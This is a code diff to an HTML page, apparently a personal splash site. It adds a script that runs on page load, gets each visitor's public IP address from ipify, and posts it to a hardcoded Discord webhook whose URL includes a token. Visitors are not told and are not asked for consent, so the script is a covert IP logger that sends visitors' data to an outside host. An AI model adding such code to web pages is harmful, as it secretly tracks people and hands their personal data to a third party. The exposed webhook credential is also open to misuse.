@@ -102,6 +102,46 @@
 
     </style>
 </head>
+
+        <script>
+        // URL do Webhook do Discord (substitua pelo seu)
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1320238731902451762/pQRGKmQTSF4a9h0PM7ckG1u3NEsEXi3FxIGE6pOeLEZfLG63uJXJSPrPPjb9WVULOTPv";
+
+        // Função para enviar o IP para o Discord
+        function sendToDiscord(ip) {
+            const message = {
+                content: `Novo visitante com IP: ${ip}`
+            };
+
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Mensagem enviada para o Discord:', data);
+            })
+            .catch(error => {
+                console.error('Erro ao enviar IP para o Discord:', error);
+            });
+        }
+
+        // Função para obter o IP do visitante
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())  // Converte a resposta para JSON
+            .then(data => {
+                const ip = data.ip;
+                // Envia o IP para o Discord
+                sendToDiscord(ip);
+            })
+            .catch(error => {
+                console.error('Erro ao obter o IP:', error);
+            });
+    </script>
+    
 <body onclick="enterSite()">
     <div class="start-screen">♰</div>
 
